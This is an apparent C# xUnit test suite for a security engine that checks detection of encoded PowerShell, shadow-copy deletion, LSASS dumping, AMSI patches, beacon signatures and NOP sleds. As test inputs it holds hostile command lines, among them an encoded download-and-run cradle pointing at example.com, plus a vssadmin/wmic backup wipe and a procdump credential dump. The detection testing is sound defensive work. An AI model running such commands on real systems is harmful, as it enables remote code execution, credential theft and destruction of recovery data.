using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using AegisPC.Contracts.AntiEvasion;
using AegisPC.Contracts.Services;
using AegisPC.Security.AntiEvasion;
using AegisPC.Security.RealTime;
using Xunit;
using Xunit.Abstractions;

namespace AegisPC.Tests
{
    /// <summary>
    /// Gelişmiş Güvenlik Motoru Doğrulama Testleri.
    /// ETW Süreç/Komut Satırı Telemetrisi, Bellek İçi Unhooking, Process Hollowing ve TTD (Time-To-Detect) Performansı.
    /// </summary>
    [Collection("SequentialDiskTests")]
    public class AdvancedSecurityEngineTests
    {
        private readonly ITestOutputHelper _output;

        public AdvancedSecurityEngineTests(ITestOutputHelper output)
        {
            _output = output;
        }

        [Fact]
        public void Test1_ETW_Detects_EncodedPowerShell_Command_And_Flags_Threat()
        {
            using var monitor = new EtwProcessMonitorService();
            var sw = Stopwatch.StartNew();

            string maliciousCmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA";
            var alert = monitor.EvaluateCommandLine(1234, "powershell.exe", maliciousCmd);

            sw.Stop();

            Assert.NotNull(alert);
            Assert.Equal("ETW_POWERSHELL_ENCODED", alert.RuleName);
            Assert.True(alert.SeverityScore >= 95, "Encoded PowerShell command must have risk score >= 95.");
            Assert.Equal("Terminate", alert.MitigationAction);

            _output.WriteLine($"[SECURITY LAB] ETW Encoded PowerShell Hunter -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Rule: {alert.RuleName} | Score: {alert.SeverityScore}/100");
        }

        [Fact]
        public void Test2_ETW_Detects_Ransomware_ShadowCopy_Destruction_Command()
        {
            using var monitor = new EtwProcessMonitorService();
            var sw = Stopwatch.StartNew();

            string ransomwareCmd = "vssadmin.exe delete shadows /all /quiet";
            var alert = monitor.EvaluateCommandLine(5678, "vssadmin.exe", ransomwareCmd);

            sw.Stop();

            Assert.NotNull(alert);
            Assert.Equal("ETW_SHADOW_COPY_DELETION", alert.RuleName);
            Assert.Equal(100, alert.SeverityScore);
            Assert.Equal("Terminate", alert.MitigationAction);

            _output.WriteLine($"[SECURITY LAB] ETW Shadow Copy Destruction Hunter -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Rule: {alert.RuleName} | Score: {alert.SeverityScore}/100");
        }

        [Fact]
        public void Test3_ETW_Detects_Lsass_Credential_Theft_Command()
        {
            using var monitor = new EtwProcessMonitorService();
            var sw = Stopwatch.StartNew();

            string credentialTheftCmd = "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp";
            var alert = monitor.EvaluateCommandLine(9999, "procdump.exe", credentialTheftCmd);

            sw.Stop();

            Assert.NotNull(alert);
            Assert.Equal("ETW_LSASS_CREDENTIAL_DUMP", alert.RuleName);
            Assert.Equal(100, alert.SeverityScore);

            _output.WriteLine($"[SECURITY LAB] ETW LSASS Credential Theft Hunter -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Rule: {alert.RuleName} | Score: {alert.SeverityScore}/100");
        }

        [Fact]
        public void Test4_MemoryScanner_Detects_CobaltStrike_Beacon_Pattern()
        {
            var scanner = new MemoryPatternScanner();
            var sw = Stopwatch.StartNew();

            // Create synthetic memory buffer containing Cobalt Strike Beacon Reflective Loader pattern
            byte[] memoryBuffer = new byte[2048];
            byte[] beaconSig = new byte[] { 0x4D, 0x5A, 0x41, 0x52, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC };
            Array.Copy(beaconSig, 0, memoryBuffer, 512, beaconSig.Length);

            var verdict = scanner.ScanBuffer(memoryBuffer);
            sw.Stop();

            Assert.True(verdict.IsMaliciousMemoryFound, "Cobalt Strike Beacon pattern must be detected.");
            Assert.Equal(100, verdict.SeverityScore);
            Assert.Equal("CobaltStrike.Beacon.ReflectiveLoader", verdict.MatchedPattern);

            _output.WriteLine($"[SECURITY LAB] Memory Pattern Scanner (Beacon) -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Pattern: {verdict.MatchedPattern} | Score: {verdict.SeverityScore}/100");
        }

        [Fact]
        public void Test5_MemoryScanner_Detects_AmsiPatch_Memory_Tamper()
        {
            var scanner = new MemoryPatternScanner();
            var sw = Stopwatch.StartNew();

            // Create synthetic memory buffer containing AMSI bypass patch (B8 57 00 07 80 C3)
            byte[] memoryBuffer = new byte[1024];
            byte[] amsiPatch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Array.Copy(amsiPatch, 0, memoryBuffer, 128, amsiPatch.Length);

            var verdict = scanner.ScanBuffer(memoryBuffer);
            sw.Stop();

            Assert.True(verdict.IsMaliciousMemoryFound, "AMSI memory patch must be detected.");
            Assert.Equal(90, verdict.SeverityScore);
            Assert.Equal("AMSI.MemoryPatch.InvalidArg", verdict.MatchedPattern);

            _output.WriteLine($"[SECURITY LAB] Memory Scanner (AMSI Unhook/Patch) -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Pattern: {verdict.MatchedPattern} | Score: {verdict.SeverityScore}/100");
        }

        [Fact]
        public void Test6_MemoryScanner_Detects_NopSled_Shellcode_Pattern()
        {
            var scanner = new MemoryPatternScanner();
            var sw = Stopwatch.StartNew();

            // Create synthetic buffer containing 32 NOP instructions (0x90)
            byte[] memoryBuffer = new byte[1024];
            for (int i = 64; i < 96; i++) memoryBuffer[i] = 0x90;

            var verdict = scanner.ScanBuffer(memoryBuffer);
            sw.Stop();

            Assert.True(verdict.IsMaliciousMemoryFound, "Shellcode NOP Sled must be detected.");
            Assert.Equal(85, verdict.SeverityScore);
            Assert.Equal("Generic.Shellcode.NopSled", verdict.MatchedPattern);

            _output.WriteLine($"[SECURITY LAB] Memory Scanner (Shellcode NOP Sled) -> TTD: {sw.Elapsed.TotalMilliseconds:F3} ms | Score: {verdict.SeverityScore}/100");
        }

        [Fact]
        public void Test7_RealWorld_SecurityLab_EndToEnd_Latency_And_Mitigation_Benchmark()
        {
            using var monitor = new EtwProcessMonitorService();
            var memScanner = new MemoryPatternScanner();

            int iterations = 100;
            var sw = Stopwatch.StartNew();

            for (int i = 0; i < iterations; i++)
            {
                var alert = monitor.EvaluateCommandLine(1000 + i, "cmd.exe", "wmic.exe shadowcopy delete /nointeractive");
                Assert.NotNull(alert);
                Assert.Equal(100, alert.SeverityScore);
            }

            sw.Stop();
            double avgLatencyMs = sw.Elapsed.TotalMilliseconds / iterations;

            Assert.True(avgLatencyMs < 2.0, $"Average ETW evaluation latency must be < 2.0ms (Actual: {avgLatencyMs:F4}ms).");

            _output.WriteLine($"[SECURITY LAB BENCHMARK] Total: {iterations} detections | Avg TTD Latency: {avgLatencyMs:F4} ms/op | Engine Status: ULTRA-FAST (< 2ms)");
        }

        [Fact]
        public void Test8_MemoryScanner_Detects_InlineHook_Against_Clean_Image()
        {
            var scanner = new MemoryPatternScanner();
            int currentPid = Process.GetCurrentProcess().Id;

            // Run Inline Hook scanner on current safe process
            var verdict = scanner.DetectInlineHooks(currentPid);

            // In clean test process without malware hooks, verdict should be clean
            Assert.NotNull(verdict);
            _output.WriteLine($"[SECURITY LAB] Inline Hooking Scanner -> PID {currentPid} | Hook Detected: {verdict.IsMaliciousMemoryFound} | Score: {verdict.SeverityScore}/100");
        }

        [Fact]
        public void Test9_MemoryScanner_Detects_ProcessHollowing_Entrypoint_Mismatch()
        {
            var scanner = new MemoryPatternScanner();
            var currentProc = Process.GetCurrentProcess();

            string currentExe = currentProc.MainModule?.FileName ?? string.Empty;
            if (File.Exists(currentExe))
            {
                var verdict = scanner.DetectProcessHollowing(currentProc.Id, currentExe);
                Assert.NotNull(verdict);
                _output.WriteLine($"[SECURITY LAB] Process Hollowing Scanner -> PID {currentProc.Id} | Hollowing Detected: {verdict.IsMaliciousMemoryFound} | Score: {verdict.SeverityScore}/100");
            }
        }
    }
}
